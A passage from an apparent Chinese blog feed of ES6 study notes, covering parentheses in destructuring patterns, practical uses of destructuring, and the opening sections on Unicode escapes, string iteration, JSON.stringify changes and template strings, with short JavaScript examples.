<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="literal">undefined</span>, <span class="number">3</span>].map(<span class="function">(<span class="params">x = <span class="string">&#x27;yes&#x27;</span></span>) =&gt;</span> x);</span><br><span class="line"><span class="comment">// [ 1, &#x27;yes&#x27;, 3 ]</span></span><br></pre></td></tr></table></figure>
<h4 id="3-6-圆括号问题"><a href="#3-6-圆括号问题" class="headerlink" title="3.6 圆括号问题"></a>3.6 圆括号问题</h4><p>解构赋值虽然很方便，但是解析起来并不容易。对于编译器来说，一个式子到底是模式，还是表达式，没有办法从一开始就知道，必须解析到（或解析不到）等号才能知道。</p>
<p>由此带来的问题是，如果模式中出现圆括号怎么处理。ES6 的规则是，只要有可能导致解构的歧义，就不得使用圆括号。</p>
<p>但是，这条规则实际上不那么容易辨别，处理起来相当麻烦。因此，建议只要有可能，就不要在模式中放置圆括号。</p>
<h5 id="3-6-1-不能使用圆括号的情况"><a href="#3-6-1-不能使用圆括号的情况" class="headerlink" title="3.6.1 不能使用圆括号的情况"></a>3.6.1 不能使用圆括号的情况</h5><p>以下三种解构赋值不得使用圆括号。</p>
<p>（1）变量声明语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部报错</span></span><br><span class="line"><span class="keyword">let</span> [(a)] = [<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">x</span>: (c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> (&#123;<span class="attr">x</span>: c&#125;) = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x: c)&#125; = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;(x): c&#125; = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">o</span>: (&#123; <span class="attr">p</span>: p &#125;) &#125; = &#123; <span class="attr">o</span>: &#123; <span class="attr">p</span>: <span class="number">2</span> &#125; &#125;;</span><br></pre></td></tr></table></figure>
<p>上面 6 个语句都会报错，因为它们都是变量声明语句，模式不能使用圆括号。</p>
<p>（2）函数参数</p>
<p>函数参数也属于变量声明，因此不能带有圆括号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[(z)]</span>) </span>&#123; <span class="keyword">return</span> z; &#125;</span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[z,(x)]</span>) </span>&#123; <span class="keyword">return</span> x; &#125;</span><br></pre></td></tr></table></figure>
<p>（3）赋值语句的模式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部报错</span></span><br><span class="line">(&#123; <span class="attr">p</span>: a &#125;) = &#123; <span class="attr">p</span>: <span class="number">42</span> &#125;;</span><br><span class="line">([a]) = [<span class="number">5</span>];</span><br></pre></td></tr></table></figure>
<p>上面代码将整个模式放在圆括号之中，导致报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line">[(&#123; <span class="attr">p</span>: a &#125;), &#123; <span class="attr">x</span>: c &#125;] = [&#123;&#125;, &#123;&#125;];</span><br></pre></td></tr></table></figure>
<p>上面代码将一部分模式放在圆括号之中，导致报错。</p>
<h5 id="3-6-2-可以使用圆括号的情况"><a href="#3-6-2-可以使用圆括号的情况" class="headerlink" title="3.6.2 可以使用圆括号的情况"></a>3.6.2 可以使用圆括号的情况</h5><p>可以使用圆括号的情况只有一种：赋值语句的非模式部分，可以使用圆括号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[(b)] = [<span class="number">3</span>]; <span class="comment">// 正确</span></span><br><span class="line">(&#123; <span class="attr">p</span>: (d) &#125; = &#123;&#125;); <span class="comment">// 正确</span></span><br><span class="line">[(<span class="built_in">parseInt</span>.prop)] = [<span class="number">3</span>]; <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure>
<p>上面三行语句都可以正确执行，因为首先它们都是赋值语句，而不是声明语句；其次它们的圆括号都不属于模式的一部分。第一行语句中，模式是取数组的第一个成员，跟圆括号无关；第二行语句中，模式是<code>p</code>，而不是<code>d</code>；第三行语句与第一行语句的性质一致。</p>
<h4 id="3-7-用途"><a href="#3-7-用途" class="headerlink" title="3.7 用途"></a>3.7 用途</h4><p>变量的解构赋值用途很多。</p>
<h5 id="（1）交换变量的值"><a href="#（1）交换变量的值" class="headerlink" title="（1）交换变量的值"></a>（1）交换变量的值</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[x, y] = [y, x];</span><br></pre></td></tr></table></figure>
<p>上面代码交换变量<code>x</code>和<code>y</code>的值，这样的写法不仅简洁，而且易读，语义非常清晰。</p>
<h5 id="（2）从函数返回多个值"><a href="#（2）从函数返回多个值" class="headerlink" title="（2）从函数返回多个值"></a>（2）从函数返回多个值</h5><p>函数只能返回一个值，如果要返回多个值，只能将它们放在数组或对象里返回。有了解构赋值，取出这些值就非常方便。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = example();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    foo: <span class="number">1</span>,</span><br><span class="line">    bar: <span class="number">2</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = example();</span><br></pre></td></tr></table></figure>
<h5 id="（3）函数参数的定义"><a href="#（3）函数参数的定义" class="headerlink" title="（3）函数参数的定义"></a>（3）函数参数的定义</h5><p>解构赋值可以方便地将一组参数与变量名对应起来。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数是一组有次序的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">[x, y, z]</span>) </span>&#123; ... &#125;</span><br><span class="line">f([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是一组无次序的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">&#123;x, y, z&#125;</span>) </span>&#123; ... &#125;</span><br><span class="line">f(&#123;<span class="attr">z</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">2</span>, <span class="attr">x</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="（4）提取-JSON-数据"><a href="#（4）提取-JSON-数据" class="headerlink" title="（4）提取 JSON 数据"></a>（4）提取 JSON 数据</h5><p>解构赋值对提取 JSON 对象中的数据，尤其有用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> jsonData = &#123;</span><br><span class="line">  id: <span class="number">42</span>,</span><br><span class="line">  status: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">  data: [<span class="number">867</span>, <span class="number">5309</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; id, status, <span class="attr">data</span>: number &#125; = jsonData;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(id, status, number);</span><br><span class="line"><span class="comment">// 42, &quot;OK&quot;, [867, 5309]</span></span><br></pre></td></tr></table></figure>
<p>上面代码可以快速提取 JSON 数据的值。</p>
<h5 id="（5）函数参数的默认值"><a href="#（5）函数参数的默认值" class="headerlink" title="（5）函数参数的默认值"></a>（5）函数参数的默认值</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">jQuery.ajax = <span class="function"><span class="keyword">function</span> (<span class="params">url, &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">async</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  beforeSend = <span class="keyword">function</span> () &#123;&#125;,</span></span></span><br><span class="line"><span class="function"><span class="params">  cache = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  complete = <span class="keyword">function</span> () &#123;&#125;,</span></span></span><br><span class="line"><span class="function"><span class="params">  crossDomain = <span class="literal">false</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="built_in">global</span> = <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="regexp">//</span> ... more config</span></span></span><br><span class="line"><span class="function"><span class="params">&#125; = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... do stuff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>指定参数的默认值，就避免了在函数体内部再写<code>var foo = config.foo || &#39;default foo&#39;;</code>这样的语句。</p>
<h5 id="（6）遍历-Map-结构"><a href="#（6）遍历-Map-结构" class="headerlink" title="（6）遍历 Map 结构"></a>（6）遍历 Map 结构</h5><p>任何部署了 Iterator 接口的对象，都可以用<code>for...of</code>循环遍历。Map 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值就非常方便。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="string">&#x27;first&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">map.set(<span class="string">&#x27;second&#x27;</span>, <span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key + <span class="string">&quot; is &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// first is hello</span></span><br><span class="line"><span class="comment">// second is world</span></span><br></pre></td></tr></table></figure>
<p>如果只想获取键名，或者只想获取键值，可以写成下面这样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取键名</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [key] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取键值</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [,value] <span class="keyword">of</span> map) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="（7）输入模块的指定方法"><a href="#（7）输入模块的指定方法" class="headerlink" title="（7）输入模块的指定方法"></a>（7）输入模块的指定方法</h5><p>加载模块时，往往需要指定输入哪些方法。解构赋值使得输入语句非常清晰。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; SourceMapConsumer, SourceNode &#125; = <span class="built_in">require</span>(<span class="string">&quot;source-map&quot;</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 变量的解构赋值</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0074</title>
    <url>/2021/06/16/%E6%89%93%E5%8D%A10074/</url>
    <content><![CDATA[<p><font color=#ae5039>所见皆为美好，所行不负年少。</font></p>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="4-字符串的扩展"><a href="#4-字符串的扩展" class="headerlink" title="4. 字符串的扩展"></a>4. 字符串的扩展</h3><p>本章介绍 ES6 对字符串的改造和增强，下一章介绍字符串对象的新增方法。</p>
<h4 id="4-1-字符的-Unicode-表示法"><a href="#4-1-字符的-Unicode-表示法" class="headerlink" title="4.1 字符的 Unicode 表示法"></a>4.1 字符的 Unicode 表示法</h4><p>ES6 加强了对 Unicode 的支持，允许采用<code>\uxxxx</code>形式表示一个字符，其中<code>xxxx</code>表示字符的 Unicode 码点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\u0061&quot;</span></span><br><span class="line"><span class="comment">// &quot;a&quot;</span></span><br></pre></td></tr></table></figure>
<p>但是，这种表示法只限于码点在<code>\u0000</code>~`\uFFFF`之间的字符。超出这个范围的字符，必须用两个双字节的形式表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\uD842\uDFB7&quot;</span></span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u20BB7&quot;</span></span><br><span class="line"><span class="comment">// &quot; 7&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，如果直接在<code>\u</code>后面跟上超过<code>0xFFFF</code>的数值（比如<code>\u20BB7</code>），JavaScript 会理解成<code>\u20BB+7</code>。由于<code>\u20BB</code>是一个不可打印字符，所以只会显示一个空格，后面跟着一个<code>7</code>。</p>
<p>ES6 对这一点做出了改进，只要将码点放入大括号，就能正确解读该字符。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\u&#123;20BB7&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\u&#123;41&#125;\u&#123;42&#125;\u&#123;43&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;ABC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hello = <span class="number">123</span>;</span><br><span class="line">hell\u&#123;6F&#125; <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;\u&#123;1F680&#125;&#x27;</span> === <span class="string">&#x27;\uD83D\uDE80&#x27;</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，最后一个例子表明，大括号表示法与四字节的 UTF-16 编码是等价的。</p>
<p>有了这种表示法之后，JavaScript 共有 6 种方法可以表示一个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\z&#x27;</span> === <span class="string">&#x27;z&#x27;</span>  <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\172&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\x7A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u007A&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;\u&#123;7A&#125;&#x27;</span> === <span class="string">&#x27;z&#x27;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h4 id="4-2-字符串的遍历器接口"><a href="#4-2-字符串的遍历器接口" class="headerlink" title="4.2 字符串的遍历器接口"></a>4.2 字符串的遍历器接口</h4><p>ES6 为字符串添加了遍历器接口（详见《Iterator》一章），使得字符串可以被<code>for...of</code>循环遍历。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> codePoint <span class="keyword">of</span> <span class="string">&#x27;foo&#x27;</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(codePoint)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;f&quot;</span></span><br><span class="line"><span class="comment">// &quot;o&quot;</span></span><br><span class="line"><span class="comment">// &quot;o&quot;</span></span><br></pre></td></tr></table></figure>
<p>除了遍历字符串，这个遍历器最大的优点是可以识别大于<code>0xFFFF</code>的码点，传统的<code>for</code>循环无法识别这样的码点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="built_in">String</span>.fromCodePoint(<span class="number">0x20BB7</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(text[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot; &quot;</span></span><br><span class="line"><span class="comment">// &quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> text) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>text</code>只有一个字符，但是<code>for</code>循环会认为它包含两个字符（都不可打印），而<code>for...of</code>循环会正确识别出这一个字符。</p>
<h4 id="4-3-直接输入-U-2028-和-U-2029"><a href="#4-3-直接输入-U-2028-和-U-2029" class="headerlink" title="4.3 直接输入 U+2028 和 U+2029"></a>4.3 直接输入 U+2028 和 U+2029</h4><p>JavaScript 字符串允许直接输入字符，以及输入字符的转义形式。举例来说，“中”的 Unicode 码点是 U+4e2d，你可以直接在字符串里面输入这个汉字，也可以输入它的转义形式<code>\u4e2d</code>，两者是等价的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;中&#x27;</span> === <span class="string">&#x27;\u4e2d&#x27;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>但是，JavaScript 规定有5个字符，不能在字符串里面直接使用，只能使用转义形式。</p>
<ul>
<li>U+005C：反斜杠（reverse solidus)</li>
<li>U+000D：回车（carriage return）</li>
<li>U+2028：行分隔符（line separator）</li>
<li>U+2029：段分隔符（paragraph separator）</li>
<li>U+000A：换行符（line feed）</li>
</ul>
<p>举例来说，字符串里面不能直接包含反斜杠，一定要转义写成<code>\\</code>或者<code>\u005c</code>。</p>
<p>这个规定本身没有问题，麻烦在于 JSON 格式允许字符串里面直接使用 U+2028（行分隔符）和 U+2029（段分隔符）。这样一来，服务器输出的 JSON 被<code>JSON.parse</code>解析，就有可能直接报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> json = <span class="string">&#x27;&quot;\u2028&quot;&#x27;</span>;</span><br><span class="line"><span class="built_in">JSON</span>.parse(json); <span class="comment">// 可能报错</span></span><br></pre></td></tr></table></figure>
<p>JSON 格式已经冻结（RFC 7159），没法修改了。为了消除这个报错，ES2019 允许 JavaScript 字符串直接输入 U+2028（行分隔符）和 U+2029（段分隔符）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PS = <span class="built_in">eval</span>(<span class="string">&quot;&#x27;\u2029&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>根据这个提案，上面的代码不会报错。</p>
<p>注意，模板字符串现在就允许直接输入这两个字符。另外，正则表达式依然不允许直接输入这两个字符，这是没有问题的，因为 JSON 本来就不允许直接包含正则表达式。</p>
<h4 id="4-4-JSON-stringify-的改造"><a href="#4-4-JSON-stringify-的改造" class="headerlink" title="4.4 JSON.stringify() 的改造"></a>4.4 JSON.stringify() 的改造</h4><p>根据标准，JSON 数据必须是 UTF-8 编码。但是，现在的<code>JSON.stringify()</code>方法有可能返回不符合 UTF-8 标准的字符串。</p>
<p>具体来说，UTF-8 标准规定，<code>0xD800</code>到<code>0xDFFF</code>之间的码点，不能单独使用，必须配对使用。比如，<code>\uD834\uDF06</code>是两个码点，但是必须放在一起配对使用，代表字符𝌆。这是为了表示码点大于<code>0xFFFF</code>的字符的一种变通方法。单独使用<code>\uD834</code>和<code>\uDFO6</code>这两个码点是不合法的，或者颠倒顺序也不行，因为<code>\uDF06\uD834</code>并没有对应的字符。</p>
<p><code>JSON.stringify()</code>的问题在于，它可能返回<code>0xD800</code>到<code>0xDFFF</code>之间的单个码点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;\u&#123;D834&#125;&#x27;</span>) <span class="comment">// &quot;\u&#123;D834&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>为了确保返回的是合法的 UTF-8 字符，ES2019 改变了<code>JSON.stringify()</code>的行为。如果遇到<code>0xD800</code>到<code>0xDFFF</code>之间的单个码点，或者不存在的配对形式，它会返回转义字符串，留给应用自己决定下一步的处理。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;\u&#123;D834&#125;&#x27;</span>) <span class="comment">// &quot;&quot;\\uD834&quot;&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&#x27;\uDF06\uD834&#x27;</span>) <span class="comment">// &quot;&quot;\\udf06\\ud834&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="4-5-模板字符串"><a href="#4-5-模板字符串" class="headerlink" title="4.5 模板字符串"></a>4.5 模板字符串</h4><p>传统的 JavaScript 语言，输出模板通常是这样写的（下面使用了 jQuery 的方法）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#result&#x27;</span>).append(</span><br><span class="line">  <span class="string">&#x27;There are &lt;b&gt;&#x27;</span> + basket.count + <span class="string">&#x27;&lt;/b&gt; &#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;items in your basket, &#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&lt;em&gt;&#x27;</span> + basket.onSale +</span><br><span class="line">  <span class="string">&#x27;&lt;/em&gt; are on sale!&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面这种写法相当繁琐不方便，ES6 引入了模板字符串解决这个问题。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#result&#x27;</span>).append(<span class="string">`</span></span><br><span class="line"><span class="string">  There are &lt;b&gt;<span class="subst">$&#123;basket.count&#125;</span>&lt;/b&gt; items</span></span><br><span class="line"><span class="string">   in your basket, &lt;em&gt;<span class="subst">$&#123;basket.onSale&#125;</span>&lt;/em&gt;</span></span><br><span class="line"><span class="string">  are on sale!</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure>
<p>模板字符串（template string）是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 普通字符串</span></span><br><span class="line"><span class="string">`In JavaScript &#x27;\n&#x27; is a line-feed.`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多行字符串</span></span><br><span class="line"><span class="string">`In JavaScript this is</span></span><br><span class="line"><span class="string"> not legal.`</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串中嵌入变量</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Bob&quot;</span>, time = <span class="string">&quot;today&quot;</span>;</span><br><span class="line"><span class="string">`Hello <span class="subst">$&#123;name&#125;</span>, how are you <span class="subst">$&#123;time&#125;</span>?`</span></span><br></pre></td></tr></table></figure>
<p>上面代码中的模板字符串，都是用反引号表示。如果在模板字符串中需要使用反引号，则前面要用反斜杠转义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> greeting = <span class="string">`\`Yo\` World!`</span>;</span><br></pre></td></tr></table></figure>
<p>如果使用模板字符串表示多行字符串，所有的空格和缩进都会被保留在输出之中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#list&#x27;</span>).html(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;first&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;second&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，所有模板字符串的空格和换行，都是被保留的，比如<code>&lt;ul&gt;</code>标签前面会有一个换行。如果你不想要这个换行，可以使用<code>trim</code>方法消除它。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#list&#x27;</span>).html(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;first&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;li&gt;second&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">`</span>.trim());</span><br></pre></td></tr></table></figure>
<p>模板字符串中嵌入变量，需要将变量名写在<code>$&#123;&#125;</code>之中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authorize</span>(<span class="params">user, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!user.hasPrivilege(action)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">      <span class="comment">// 传统写法为</span></span><br><span class="line">      <span class="comment">// &#x27;User &#x27;</span></span><br><span class="line">      <span class="comment">// + user.name</span></span><br><span class="line">      <span class="comment">// + &#x27; is not authorized to do &#x27;</span></span><br><span class="line">      <span class="comment">// + action</span></span><br><span class="line">      <span class="comment">// + &#x27;.&#x27;</span></span><br><span class="line">      <span class="string">`User <span class="subst">$&#123;user.name&#125;</span> is not authorized to do <span class="subst">$&#123;action&#125;</span>.`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大括号内部可以放入任意的 JavaScript 表达式，可以进行运算，以及引用对象属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">`<span class="subst">$&#123;x&#125;</span> + <span class="subst">$&#123;y&#125;</span> = <span class="subst">$&#123;x + y&#125;</span>`</span></span><br><span class="line"><span class="comment">// &quot;1 + 2 = 3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">`<span class="subst">$&#123;x&#125;</span> + <span class="subst">$&#123;y * <span class="number">2</span>&#125;</span> = <span class="subst">$&#123;x + y * <span class="number">2</span>&#125;</span>`</span></span><br><span class="line"><span class="comment">// &quot;1 + 4 = 5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="string">`<span class="subst">$&#123;obj.x + obj.y&#125;</span>`</span></span><br><span class="line"><span class="comment">// &quot;3&quot;</span></span><br></pre></td></tr></table></figure>
<p>模板字符串之中还能调用函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">`foo <span class="subst">$&#123;fn()&#125;</span> bar`</span></span><br><span class="line"><span class="comment">// foo Hello World bar</span></span><br></pre></td></tr></table></figure>
<p>如果大括号中的值不是字符串，将按照一般的规则转为字符串。比如，大括号中是一个对象，将默认调用对象的<code>toString</code>方法。</p>
<p>如果模板字符串中的变量没有声明，将报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 变量place没有声明</span></span><br><span class="line"><span class="keyword">let</span> msg = <span class="string">`Hello, <span class="subst">$&#123;place&#125;</span>`</span>;</span><br><span class="line"><span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>由于模板字符串的大括号内部，就是执行 JavaScript 代码，因此如果大括号内部是一个字符串，将会原样输出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">`Hello <span class="subst">$&#123;<span class="string">&#x27;World&#x27;</span>&#125;</span>`</span></span><br><span class="line"><span class="comment">// &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>
<p>模板字符串甚至还能嵌套。</p>
